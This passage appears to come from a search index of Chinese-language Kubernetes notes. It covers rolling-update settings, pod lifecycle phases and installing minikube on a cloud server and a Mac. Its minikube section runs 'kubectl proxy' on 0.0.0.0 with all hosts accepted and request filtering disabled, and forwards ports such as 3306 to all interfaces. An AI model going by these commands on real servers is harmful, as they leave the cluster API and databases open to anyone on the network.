25%) = 8 \u6240\u4ee5\u6211\u4eec\u770b\u5230 AVAILABLE \u5c31\u662f 8\u3002 maxSurge \u503c\u8d8a\u5927\uff0c\u521d\u59cb\u521b\u5efa\u7684\u65b0\u526f\u672c\u6570\u91cf\u5c31\u8d8a\u591a\uff1bmaxUnavailable \u503c\u8d8a\u5927\uff0c\u521d\u59cb\u9500\u6bc1\u7684\u65e7\u526f\u672c\u6570\u91cf\u5c31\u8d8a\u591a\u3002 \u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u8fd9\u4e2a\u6848\u4f8b\u6eda\u52a8\u66f4\u65b0\u7684\u8fc7\u7a0b\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a \u9996\u5148\u521b\u5efa 3 \u4e2a\u65b0\u526f\u672c\u4f7f\u526f\u672c\u603b\u6570\u8fbe\u5230 13 \u4e2a\u3002 \u7136\u540e\u9500\u6bc1 2 \u4e2a\u65e7\u526f\u672c\u4f7f\u53ef\u7528\u7684\u526f\u672c\u6570\u964d\u5230 8 \u4e2a\u3002 \u5f53\u8fd9 2 \u4e2a\u65e7\u526f\u672c\u6210\u529f\u9500\u6bc1\u540e\uff0c\u53ef\u518d\u521b\u5efa 2 \u4e2a\u65b0\u526f\u672c\uff0c\u4f7f\u526f\u672c\u603b\u6570\u4fdd\u6301\u4e3a 13 \u4e2a\u3002 \u5f53\u65b0\u526f\u672c\u901a\u8fc7 Readiness \u63a2\u6d4b\u540e\uff0c\u4f1a\u4f7f\u53ef\u7528\u526f\u672c\u6570\u589e\u52a0\uff0c\u8d85\u8fc7 8\u3002 \u8fdb\u800c\u53ef\u4ee5\u7ee7\u7eed\u9500\u6bc1\u66f4\u591a\u7684\u65e7\u526f\u672c\uff0c\u4f7f\u53ef\u7528\u526f\u672c\u6570\u56de\u5230 8\u3002 \u65e7\u526f\u672c\u7684\u9500\u6bc1\u4f7f\u526f\u672c\u603b\u6570\u4f4e\u4e8e 13\uff0c\u8fd9\u6837\u5c31\u5141\u8bb8\u521b\u5efa\u66f4\u591a\u7684\u65b0\u526f\u672c\u3002 \u8fd9\u4e2a\u8fc7\u7a0b\u4f1a\u6301\u7eed\u8fdb\u884c\uff0c\u6700\u7ec8\u6240\u6709\u7684\u65e7\u526f\u672c\u90fd\u4f1a\u88ab\u65b0\u526f\u672c\u66ff\u6362\uff0c\u6eda\u52a8\u66f4\u65b0\u5b8c\u6210\u3002 \u800c\u6211\u4eec\u7684\u5b9e\u9645\u60c5\u51b5\u662f\u5728\u7b2c 4 \u6b65\u5c31\u5361\u4f4f\u4e86\uff0c\u65b0\u526f\u672c\u65e0\u6cd5\u901a\u8fc7 Readiness \u63a2\u6d4b\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u5728 kubectl describe deployment app \u7684\u65e5\u5fd7\u90e8\u5206\u67e5\u770b\u3002 \u5982\u679c\u6eda\u52a8\u66f4\u65b0\u5931\u8d25\uff0c\u53ef\u4ee5\u901a\u8fc7 kubectl rollout undo \u56de\u6eda\u5230\u4e0a\u4e00\u4e2a\u7248\u672c\u3002 \u5b9a\u5236 maxSurge \u548c maxUnavailable \u5982\u679c\u8981\u5b9a\u5236 maxSurge \u548c maxUnavailable\uff0c\u53ef\u4ee5\u5982\u4e0b\u914d\u7f6e\uff1a apiVersion: apps/v1beta1 kind: Deployment metadata: name: app spec: strategy: rollingUpdate: maxSurge: 35% maxUnavailable: 35% replicas: 10 template: metadata: labels: run: app spec: containers: - name: app image: busybox args: - /bin/sh - -c - sleep 3000 readinessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 10 periodSeconds: 5 \u5728\u963f\u91cc\u4e91\u4e2d\u7684\u8bbe\u7f6e\u4e3a\uff1a","title":"\u6eda\u52a8\u5347\u7ea7\u4e2d\u7684maxSurge\u548cmaxUnavailable"},{"location":"lxc/kubernetes/%E6%BB%9A%E5%8A%A8%E5%8D%87%E7%BA%A7%E4%B8%AD%E7%9A%84maxSurge%E5%92%8CmaxUnavailable/#maxsurge","text":"\u6b64\u53c2\u6570\u63a7\u5236\u6eda\u52a8\u66f4\u65b0\u8fc7\u7a0b\u4e2d\u526f\u672c\u603b\u6570\u7684\u8d85\u8fc7 DESIRED \u7684\u4e0a\u9650\u3002maxSurge \u53ef\u4ee5\u662f\u5177\u4f53\u7684\u6574\u6570\uff08\u6bd4\u5982 3\uff09\uff0c\u4e5f\u53ef\u4ee5\u662f\u767e\u5206\u767e\uff0c\u5411\u4e0a\u53d6\u6574\u3002maxSurge \u9ed8\u8ba4\u503c\u4e3a 25%\u3002 \u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0cDESIRED \u4e3a 10\uff0c\u90a3\u4e48\u526f\u672c\u603b\u6570\u7684\u6700\u5927\u503c\u4e3a\uff1a roundUp(10 + 10 * 25%) = 13 \u6240\u4ee5\u6211\u4eec\u770b\u5230 CURRENT \u5c31\u662f 13\u3002","title":"maxSurge"},{"location":"lxc/kubernetes/%E6%BB%9A%E5%8A%A8%E5%8D%87%E7%BA%A7%E4%B8%AD%E7%9A%84maxSurge%E5%92%8CmaxUnavailable/#maxunavailable","text":"\u6b64\u53c2\u6570\u63a7\u5236\u6eda\u52a8\u66f4\u65b0\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u7528\u7684\u526f\u672c\u76f8\u5360 DESIRED \u7684\u6700\u5927\u6bd4\u4f8b\u3002 maxUnavailable \u53ef\u4ee5\u662f\u5177\u4f53\u7684\u6574\u6570\uff08\u6bd4\u5982 3\uff09\uff0c\u4e5f\u53ef\u4ee5\u662f\u767e\u5206\u767e\uff0c\u5411\u4e0b\u53d6\u6574\u3002maxUnavailable \u9ed8\u8ba4\u503c\u4e3a 25%\u3002 \u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0cDESIRED \u4e3a 10\uff0c\u90a3\u4e48\u53ef\u7528\u7684\u526f\u672c\u6570\u81f3\u5c11\u8981\u4e3a\uff1a 10 - roundDown(10 * 25%) = 8 \u6240\u4ee5\u6211\u4eec\u770b\u5230 AVAILABLE \u5c31\u662f 8\u3002 maxSurge \u503c\u8d8a\u5927\uff0c\u521d\u59cb\u521b\u5efa\u7684\u65b0\u526f\u672c\u6570\u91cf\u5c31\u8d8a\u591a\uff1bmaxUnavailable \u503c\u8d8a\u5927\uff0c\u521d\u59cb\u9500\u6bc1\u7684\u65e7\u526f\u672c\u6570\u91cf\u5c31\u8d8a\u591a\u3002 \u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u8fd9\u4e2a\u6848\u4f8b\u6eda\u52a8\u66f4\u65b0\u7684\u8fc7\u7a0b\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a \u9996\u5148\u521b\u5efa 3 \u4e2a\u65b0\u526f\u672c\u4f7f\u526f\u672c\u603b\u6570\u8fbe\u5230 13 \u4e2a\u3002 \u7136\u540e\u9500\u6bc1 2 \u4e2a\u65e7\u526f\u672c\u4f7f\u53ef\u7528\u7684\u526f\u672c\u6570\u964d\u5230 8 \u4e2a\u3002 \u5f53\u8fd9 2 \u4e2a\u65e7\u526f\u672c\u6210\u529f\u9500\u6bc1\u540e\uff0c\u53ef\u518d\u521b\u5efa 2 \u4e2a\u65b0\u526f\u672c\uff0c\u4f7f\u526f\u672c\u603b\u6570\u4fdd\u6301\u4e3a 13 \u4e2a\u3002 \u5f53\u65b0\u526f\u672c\u901a\u8fc7 Readiness \u63a2\u6d4b\u540e\uff0c\u4f1a\u4f7f\u53ef\u7528\u526f\u672c\u6570\u589e\u52a0\uff0c\u8d85\u8fc7 8\u3002 \u8fdb\u800c\u53ef\u4ee5\u7ee7\u7eed\u9500\u6bc1\u66f4\u591a\u7684\u65e7\u526f\u672c\uff0c\u4f7f\u53ef\u7528\u526f\u672c\u6570\u56de\u5230 8\u3002 \u65e7\u526f\u672c\u7684\u9500\u6bc1\u4f7f\u526f\u672c\u603b\u6570\u4f4e\u4e8e 13\uff0c\u8fd9\u6837\u5c31\u5141\u8bb8\u521b\u5efa\u66f4\u591a\u7684\u65b0\u526f\u672c\u3002 \u8fd9\u4e2a\u8fc7\u7a0b\u4f1a\u6301\u7eed\u8fdb\u884c\uff0c\u6700\u7ec8\u6240\u6709\u7684\u65e7\u526f\u672c\u90fd\u4f1a\u88ab\u65b0\u526f\u672c\u66ff\u6362\uff0c\u6eda\u52a8\u66f4\u65b0\u5b8c\u6210\u3002 \u800c\u6211\u4eec\u7684\u5b9e\u9645\u60c5\u51b5\u662f\u5728\u7b2c 4 \u6b65\u5c31\u5361\u4f4f\u4e86\uff0c\u65b0\u526f\u672c\u65e0\u6cd5\u901a\u8fc7 Readiness \u63a2\u6d4b\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u5728 kubectl describe deployment app \u7684\u65e5\u5fd7\u90e8\u5206\u67e5\u770b\u3002 \u5982\u679c\u6eda\u52a8\u66f4\u65b0\u5931\u8d25\uff0c\u53ef\u4ee5\u901a\u8fc7 kubectl rollout undo \u56de\u6eda\u5230\u4e0a\u4e00\u4e2a\u7248\u672c\u3002","title":"maxUnavailable"},{"location":"lxc/kubernetes/%E6%BB%9A%E5%8A%A8%E5%8D%87%E7%BA%A7%E4%B8%AD%E7%9A%84maxSurge%E5%92%8CmaxUnavailable/#maxsurge-maxunavailable","text":"\u5982\u679c\u8981\u5b9a\u5236 maxSurge \u548c maxUnavailable\uff0c\u53ef\u4ee5\u5982\u4e0b\u914d\u7f6e\uff1a apiVersion: apps/v1beta1 kind: Deployment metadata: name: app spec: strategy: rollingUpdate: maxSurge: 35% maxUnavailable: 35% replicas: 10 template: metadata: labels: run: app spec: containers: - name: app image: busybox args: - /bin/sh - -c - sleep 3000 readinessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 10 periodSeconds: 5 \u5728\u963f\u91cc\u4e91\u4e2d\u7684\u8bbe\u7f6e\u4e3a\uff1a","title":"\u5b9a\u5236 maxSurge \u548c maxUnavailable"},{"location":"lxc/kubernetes/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","text":"\u5728Kubernetes (K8S) \u4e2d\uff0c\u4e00\u4e2a Pod \u7684\u751f\u547d\u5468\u671f\u5305\u62ec\u4ee5\u4e0b\u51e0\u4e2a\u9636\u6bb5\uff1a 1.Pending\uff08\u7b49\u5f85\uff09 : \u5728\u8fd9\u4e2a\u9636\u6bb5\uff0cPod \u5df2\u88ab Kubernetes \u7cfb\u7edf\u63a5\u53d7\uff0c\u4f46\u662f\u8fd8\u6709\u4e00\u4e2a\u6216\u591a\u4e2a\u5bb9\u5668\u955c\u50cf\u6ca1\u6709\u521b\u5efa\uff0c\u8fd9\u53ef\u80fd\u662f\u56e0\u4e3a\u955c\u50cf\u6b63\u5728\u4e0b\u8f7d\u3002 2.Running\uff08\u8fd0\u884c\u4e2d\uff09 : \u5728\u8fd9\u4e2a\u9636\u6bb5\uff0cKubernetes \u5df2\u7ecf\u4e3a Pod \u5206\u914d\u4e86\u4e00\u4e2a\u8282\u70b9\uff0c\u5e76\u4e14\u6240\u6709\u7684\u5bb9\u5668\u90fd\u5df2\u521b\u5efa\u3002\u81f3\u5c11\u6709\u4e00\u4e2a\u5bb9\u5668\u6b63\u5728\u8fd0\u884c\uff0c\u6216\u8005\u6b63\u5728\u542f\u52a8\u6216\u91cd\u542f\u3002 3.Succeeded\uff08\u6210\u529f\uff09 : \u5982\u679c Pod \u4e2d\u7684\u6240\u6709\u5bb9\u5668\u90fd\u6b63\u5e38\u8fd0\u884c\u5e76\u4e14\u5df2\u7ecf\u9000\u51fa\uff0c\u5e76\u4e14\u4e0d\u4f1a\u518d\u6b21\u91cd\u542f\uff0c\u90a3\u4e48 Pod \u7684\u72b6\u6001\u4f1a\u88ab\u6807\u8bb0\u4e3a Succeeded\u3002 4.Failed\uff08\u5931\u8d25\uff09 : \u5982\u679c Pod \u4e2d\u7684\u5bb9\u5668\u56e0\u4e3a\u67d0\u4e9b\u539f\u56e0\u5931\u8d25\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u5bb9\u5668\u4ee5\u975e\u96f6\u72b6\u6001\u9000\u51fa\uff0cPod \u7684\u72b6\u6001\u4f1a\u88ab\u6807\u8bb0\u4e3a Failed\u3002 5.Unknown\uff08\u672a\u77e5\uff09 : \u7531\u4e8e\u67d0\u4e9b\u539f\u56e0\uff0cPod \u7684\u72b6\u6001\u65e0\u6cd5\u786e\u5b9a\uff0c\u901a\u5e38\u662f\u56e0\u4e3a\u4e0e Pod \u901a\u4fe1\u5931\u8d25\u3002 6.CrashLoopBackOff\uff08\u5d29\u6e83\u5faa\u73af\uff09 : \u8fd9\u4e0d\u662f Pod \u751f\u547d\u5468\u671f\u7684\u6b63\u5f0f\u9636\u6bb5\uff0c\u4f46\u5b83\u5e38\u5e38\u51fa\u73b0\u3002\u5f53 Pod \u4e2d\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u5bb9\u5668\u65e0\u6cd5\u6b63\u5e38\u542f\u52a8\u5e76\u4e14\u4e0d\u65ad\u5c1d\u8bd5\u91cd\u542f\u65f6\uff0c\u5c31\u4f1a\u51fa\u73b0\u8fd9\u79cd\u72b6\u6001\u3002 \u8fd9\u4e9b\u72b6\u6001\u53cd\u6620\u4e86 Pod \u4ece\u521b\u5efa\u5230\u7ed3\u675f\u7684\u6574\u4e2a\u751f\u547d\u5468\u671f\u3002\u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b Pod \u7684\u72b6\u6001\u8f6c\u6362\u548c\u76f8\u5173\u4e8b\u4ef6\uff0c\u6bd4\u5982\u91cd\u542f\u7b56\u7565\u3001\u5c31\u7eea\u63a2\u9488\u3001\u5b58\u6d3b\u63a2\u9488\u7b49\uff0c\u8fd9\u4e9b\u90fd\u4f1a\u5f71\u54cd Pod \u7684\u884c\u4e3a\u548c\u72b6\u6001\u3002","title":"pod\u751f\u547d\u5468\u671f"},{"location":"lxc/kubernetes/minikube/minikube/","text":"\u90e8\u7f72Minikube ECS\u90e8\u7f72Minikube \u6211\u7684ECS\u662f\u817e\u8baf\u4e91\u7684\uff0cCentos7.6 \u955c\u50cf\uff0c\u5730\u57df\u5728\u7845\u8c37\uff0c\u56e0\u4e3aK8S\u5f88\u591a\u955c\u50cf\u90fd\u5728\u6d77\u5916\uff0c\u56fd\u5185\u5373\u4f7f\u6709\u817e\u8baf\u963f\u91cc\u7684\u6e90\uff0c\u4f46\u662f\u7ecf\u5e38\u4e5f\u4e0b\u8f7d\u4e0d\u4e0b\u6765\uff0c\u6298\u817e\u4e86\u5f88\u591a\u904d\uff0c\u4e0d\u6298\u817e\u4e86\uff0c\u76f4\u63a5\u5730\u57df\u9009\u62e9\u6d77\u5916\uff0c\u8282\u7701\u5f88\u591a\u5fc3\u529b \u5b98\u65b9\u6e90\u7801\uff1a kubernetes/minikube: Run Kubernetes locally (github.com) \u5b98\u7f51\u64cd\u4f5c\u6587\u6863\uff1a minikube start | minikube (k8s.io) \u673a\u5668\u9700\u8981\u5b89\u88c5 Kubectl\u548cDocker Kubectl\u5b89\u88c5\uff1ahttps://kubernetes.io/docs/tasks/tools/install-kubectl-linux/ \u7248\u672c\u9009\u62e9\uff1a #\u8bbe\u7f6e\u6e90 cat <<EOF | sudo tee /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://packages.cloud.google.com/yum/repos/kubernetes-el7-\\$basearch enabled=1 gpgcheck=1 gpgkey=https://packages.cloud.google.com/yum/doc/yum-key.gpg https://packages.cloud.google.com/yum/doc/rpm-package-key.gpg EOF yum list kubectl --showduplicates | sort -r yum install -y kubectl-1.18.20-0 Docker\u5b89\u88c5\uff1ahttps://docs.docker.com/engine/install/centos/ sudo yum install -y yum-utils sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin systemctl start docker systemctl enable docker \u5b89\u88c5minikube #\u5b89\u88c5minikube curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 sudo install minikube-linux-amd64 /usr/local/bin/minikube # minikube\u542f\u52a8\u96c6\u7fa4\uff0c--image-mirror-country='cn'\u5c31\u662f\u5728\u4e2d\u56fd\u533a\u5b89\u88c5\u96c6\u7fa4\uff0c\u4e0b\u8f7d\u955c\u50cf\u4ece\u963f\u91cc\u4e91\u4e0b\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u53d1\u73b0\u8fd8\u662f\u6709\u5f88\u591a\u955c\u50cf\u4e0b\u8f7d\u4e0d\u4e0b\u6765 # minikube start --image-mirror-country='cn' --force --driver=docker --nodes=2 --cpus=2 --memory=3000MB --network-plugin=cni --cni=flannel --extra-config=kubeadm.pod-network-cidr=10.244.0.0/16 --kubernetes-version=v1.18.20 # \u6d77\u5916\u76f4\u63a5\u7528\u4e0b\u9762\u8fd9\u6761\u547d\u4ee4 minikube start --force --driver=docker --nodes=2 --network-plugin=cni --cni=flannel --extra-config=kubeadm.pod-network-cidr=10.244.0.0/16 --kubernetes-version=v1.18.20 #\u5982\u679c\u4e0d\u8bbe\u7f6ecni\uff0c\u540e\u7eed\u6dfb\u52a0\u8282\u70b9\uff0c\u4f1a\u51fa\u73b0Cluster was created without any CNI, adding a node to it might cause broken networking\u3002\u5c31\u662f\u540e\u7eed\u7684\u8282\u70b9\u65e0\u6cd5\u8bbf\u95ee\u96c6\u7fa4\u5185\u7684service #\u6dfb\u52a0\u8282\u70b9\uff0c\u53ef\u4ee5\u4e0d\u6dfb\u52a0\uff0c\u4e0a\u9762\u547d\u4ee4\u5df2\u7ecf\u6dfb\u52a0\u4e86\u4e24\u4e2a\u8282\u70b9 minikube node add \u90e8\u7f72\u5b8c\u6210 \u8f6c\u53d1 service \u7684\u7aef\u53e3\u5230ecs \u7684\u7aef\u53e3 \uff0c-n \u6307\u5b9a\u547d\u540d\u7a7a\u95f4\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u6620\u5c04POD kubectl port-forward -n infra svc/consul-net --address 0.0.0.0 8500:8500 kubectl port-forward -n namespace $POD_NAME --address 0.0.0.0 3306:3306 \u540e\u53f0\u8fd0\u884c nohup kubectl port-forward svc/infra-consul-net --address 0.0.0.0 8500:8500 >>forward-8500.log 2>&1 & \u8bbf\u95eek8s\u9762\u677f kubectl proxy --port=8001 --address='0.0.0.0' --accept-hosts='^.*' --disable-filter=true \u8bbf\u95eedashboard\u5730\u5740 http://ECS\u5730\u5740:8001/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/#/overview?namespace=default \u6d4b\u8bd5\u96c6\u7fa4 # \u521b\u5efadeployment # kubectl create deployment nginx --image=nginx deployment.apps/nginx created #\u6269\u5bb9deployment # kubectl scale deployment nginx --replicas=5 deployment.apps/nginx scaled # \u521b\u5efaservice # kubectl expose deployment nginx --port=80 --type=NodePort service/nginx exposed # kubectl get pods,svc \u6d4b\u8bd5\u5b8c\u96c6\u7fa4\uff0c\u53ef\u4ee5\u91cd\u65b0\u521d\u59cb\u5316\u96c6\u7fa4\uff0c\u7701\u7684\u4e00\u4e2a\u4e2a\u5220\u9664\u8d44\u6e90 #\u505c\u6b62\u96c6\u7fa4 minikube stop #\u5220\u9664\u96c6\u7fa4 minikube delete Mac \u90e8\u7f72 minikube \u56e0\u4e3a\u5f88\u591a\u955c\u50cf\u5728\u6d77\u5916\uff0c\u9700\u8981\u5b89\u88c5\u4ee3\u7406\u8f6f\u4ef6 Release \u652f\u6301apple arm64,\u4fee\u590dtrojan\u5bfc\u5165\u95ee\u9898 \u00b7 yanue/V2rayU (github.com) \u8bbe\u7f6e\u597d\u4ee3\u7406\u4e4b\u540e\uff0c\u5728mac\u7ec8\u7aef\u5185\u7c98\u8d34\u5982\u4e0b\u547d\u4ee4 export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;export ALL_PROXY=socks5://127.0.0.1:1080 export NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.59.0/24,192.168.49.0/24,192.168.39.0/24 \u4e0b\u8f7d\u5b89\u88c5virtualbox Downloads \u2013 Oracle VM VirtualBox \u5b89\u88c5kubectl Install and Set Up kubectl on macOS | Kubernetes \u5f00\u59cb\u5b89\u88c5minikube $ minikube start --force --driver=virtualbox --kubernetes-version=v1.18.20 --nodes=2 \ud83d\ude04 Darwin 11.6.5 \u4e0a\u7684 minikube v1.26.1 \u2757 minikube skips various validations when --force is supplied; this may lead to unexpected behavior \u2728 \u6839\u636e\u7528\u6237\u914d\u7f6e\u4f7f\u7528 virtualbox \u9a71\u52a8\u7a0b\u5e8f \u2757 Local proxy ignored: not passing HTTP_PROXY=http://127.0.0.1:1087 to docker env. \u2757 Local proxy ignored: not passing HTTPS_PROXY=http://127.0.0.1:1087 to docker env. \ud83d\udc4d Starting control plane node minikube in cluster minikube \ud83d\udd25 Creating virtualbox VM (CPUs=2, Memory=2200MB, Disk=20000MB) ... \u2757 Local proxy ignored: not passing HTTP_PROXY=http://127.0.0.1:1087 to docker env. \u2757 Local proxy ignored: not passing HTTPS_PROXY=http://127.0.0.1:1087 to docker env. \ud83c\udf10 \u627e\u5230\u7684\u7f51\u7edc\u9009\u9879\uff1a \u25aa NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.59.0/24,192.168.49.0/24,192.168.39.0/24 \u25aa http_proxy=http://127.0.0.1:1087 \u25aa https_proxy=http://127.0.0.1:1087 \u2757 This VM is having trouble accessing https://k8s.gcr.io \ud83d\udca1 To pull new external images, you may need to configure a proxy: https://minikube.sigs.k8s.io/docs/reference/networking/proxy/ \ud83d\udc33 \u6b63\u5728 Docker 20.10.17 \u4e2d\u51c6\u5907 Kubernetes v1.18.20\u2026 \u25aa env NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.59.0/24,192.168.49.0/24,192.168.39.0/24 \u25aa kubelet.cni-conf-dir=/etc/cni/net.mk \u25aa Generating certificates and keys ... \u25aa Booting up control plane ... \u25aa Configuring RBAC rules ... \ud83d\udd17 Configuring CNI (Container Networking Interface) ... \u25aa Using image gcr.io/k8s-minikube/storage-provisioner:v5 \ud83c\udf1f Enabled addons: storage-provisioner, default-storageclass \ud83d\udd0e Verifying Kubernetes components... \ud83d\udc4d Starting worker node minikube-m02 in cluster minikube \ud83d\udd25 Creating virtualbox VM (CPUs=2, Memory=2200MB, Disk=20000MB) ... \u2757 Local proxy ignored: not passing HTTP_PROXY=http://127.0.0.1:1087 to docker env. \u2757 Local proxy ignored: not passing HTTPS_PROXY=http://127.0.0.1:1087 to docker env. \ud83c\udf10 \u627e\u5230\u7684\u7f51\u7edc\u9009\u9879\uff1a \u25aa NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.59.0/24,192.168.49.0/24,192.168.39.0/24 \u25aa http_proxy=http://127.0.0.1:1087 \u25aa https_proxy=http://127.0.0.1:1087 \u2757 This VM is having trouble accessing https://k8s.gcr.io \ud83d\udca1 To pull new external images, you may need to configure a proxy: https://minikube.sigs.k8s.io/docs/reference/networking/proxy/ \ud83d\udc33 \u6b63\u5728 Docker 20.10.17 \u4e2d\u51c6\u5907 Kubernetes v1.18.20\u2026 \u25aa env NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.59.0/24,192.168.49.0/24,192.168.39.0/24 \ud83d\udd0e Verifying Kubernetes components... \u2757 /usr/local/bin/kubectl is version 1.25.0, which may have incompatibilites with Kubernetes 1.18.20. \u25aa Want kubectl v1.18.20? Try 'minikube kubectl -- get pods -A' \ud83c\udfc4 Done! kubectl is now configured to use \"minikube\" cluster and \"default\" namespace by default $ kubectl get node -A -o wide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME minikube Ready master 21m v1.18.20 192.168.59.107 <none> Buildroot 2021.02.12 5.10.57 docker://20.10.17 minikube-m02 Ready <none> 20m v1.18.20 192.168.59.108 <none> Buildroot 2021.02.12 5.10.57 docker://20.10.17","title":"minikube"},{"location":"lxc/kubernetes/minikube/minikube/#minikube","text":"","title":"\u90e8\u7f72Minikube"},{"location":"lxc/kubernetes/minikube/minikube/#ecsminikube","text":"\u6211\u7684ECS\u662f\u817e\u8baf\u4e91\u7684\uff0cCentos7.6 \u955c\u50cf\uff0c\u5730\u57df\u5728\u7845\u8c37\uff0c\u56e0\u4e3aK8S\u5f88\u591a\u955c\u50cf\u90fd\u5728\u6d77\u5916\uff0c\u56fd\u5185\u5373\u4f7f\u6709\u817e\u8baf\u963f\u91cc\u7684\u6e90\uff0c\u4f46\u662f\u7ecf\u5e38\u4e5f\u4e0b\u8f7d\u4e0d\u4e0b\u6765\uff0c\u6298\u817e\u4e86\u5f88\u591a\u904d\uff0c\u4e0d\u6298\u817e\u4e86\uff0c\u76f4\u63a5\u5730\u57df\u9009\u62e9\u6d77\u5916\uff0c\u8282\u7701\u5f88\u591a\u5fc3\u529b \u5b98\u65b9\u6e90\u7801\uff1a kubernetes/minikube: Run Kubernetes locally (github.com) \u5b98\u7f51\u64cd\u4f5c\u6587\u6863\uff1a minikube start | minikube (k8s.io) \u673a\u5668\u9700\u8981\u5b89\u88c5 Kubectl\u548cDocker Kubectl\u5b89\u88c5\uff1ahttps://kubernetes.io/docs/tasks/tools/install-kubectl-linux/ \u7248\u672c\u9009\u62e9\uff1a #\u8bbe\u7f6e\u6e90 cat <<EOF | sudo tee /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://packages.cloud.google.com/yum/repos/kubernetes-el7-\\$basearch enabled=1 gpgcheck=1 gpgkey=https://packages.cloud.google.com/yum/doc/yum-key.gpg https://packages.cloud.google.com/yum/doc/rpm-package-key.gpg EOF yum list kubectl --showduplicates | sort -r yum install -y kubectl-1.18.20-0 Docker\u5b89\u88c5\uff1ahttps://docs.docker.com/engine/install/centos/ sudo yum install -y yum-utils sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin systemctl start docker systemctl enable docker \u5b89\u88c5minikube #\u5b89\u88c5minikube curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 sudo install minikube-linux-amd64 /usr/local/bin/minikube # minikube\u542f\u52a8\u96c6\u7fa4\uff0c--image-mirror-country='cn'\u5c31\u662f\u5728\u4e2d\u56fd\u533a\u5b89\u88c5\u96c6\u7fa4\uff0c\u4e0b\u8f7d\u955c\u50cf\u4ece\u963f\u91cc\u4e91\u4e0b\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u53d1\u73b0\u8fd8\u662f\u6709\u5f88\u591a\u955c\u50cf\u4e0b\u8f7d\u4e0d\u4e0b\u6765 # minikube start --image-mirror-country='cn' --force --driver=docker --nodes=2 --cpus=2 --memory=3000MB --network-plugin=cni --cni=flannel --extra-config=kubeadm.pod-network-cidr=10.244.0.0/16 --kubernetes-version=v1.18.20 # \u6d77\u5916\u76f4\u63a5\u7528\u4e0b\u9762\u8fd9\u6761\u547d\u4ee4 minikube start --force --driver=docker --nodes=2 --network-plugin=cni --cni=flannel --extra-config=kubeadm.pod-network-cidr=10.244.0.0/16 --kubernetes-version=v1.18.20 #\u5982\u679c\u4e0d\u8bbe\u7f6ecni\uff0c\u540e\u7eed\u6dfb\u52a0\u8282\u70b9\uff0c\u4f1a\u51fa\u73b0Cluster was created without any CNI, adding a node to it might cause broken networking\u3002\u5c31\u662f\u540e\u7eed\u7684\u8282\u70b9\u65e0\u6cd5\u8bbf\u95ee\u96c6\u7fa4\u5185\u7684service #\u6dfb\u52a0\u8282\u70b9\uff0c\u53ef\u4ee5\u4e0d\u6dfb\u52a0\uff0c\u4e0a\u9762\u547d\u4ee4\u5df2\u7ecf\u6dfb\u52a0\u4e86\u4e24\u4e2a\u8282\u70b9 minikube node add \u90e8\u7f72\u5b8c\u6210 \u8f6c\u53d1 service \u7684\u7aef\u53e3\u5230ecs \u7684\u7aef\u53e3 \uff0c-n \u6307\u5b9a\u547d\u540d\u7a7a\u95f4\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u6620\u5c04POD kubectl port-forward -n infra svc/consul-net --address 0.0.0.0 8500:8500 kubectl port-forward -n namespace $POD_NAME --address 0.0.0.0 3306:3306 \u540e\u53f0\u8fd0\u884c nohup kubectl port-forward svc/infra-consul-net --address 0.0.0.0 8500:8500 >>forward-8500.log 2>&1 & \u8bbf\u95eek8s\u9762\u677f kubectl proxy --port=8001 --address='0.0.0.0' --accept-hosts='^.*' --disable-filter=true \u8bbf\u95eedashboard\u5730\u5740 http://ECS\u5730\u5740:8001/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/#/overview?namespace=default \u6d4b\u8bd5\u96c6\u7fa4 # \u521b\u5efadeployment # kubectl create deployment nginx --image=nginx deployment.apps/nginx created #\u6269\u5bb9deployment # kubectl scale deployment nginx --replicas=5 deployment.apps/nginx scaled # \u521b\u5efaservice # kubectl expose deployment nginx --port=80 --type=NodePort service/nginx exposed # kubectl get pods,svc \u6d4b\u8bd5\u5b8c\u96c6\u7fa4\uff0c\u53ef\u4ee5\u91cd\u65b0\u521d\u59cb\u5316\u96c6\u7fa4\uff0c\u7701\u7684\u4e00\u4e2a\u4e2a\u5220\u9664\u8d44\u6e90 #\u505c\u6b62\u96c6\u7fa4 minikube stop #\u5220\u9664\u96c6\u7fa4 minikube 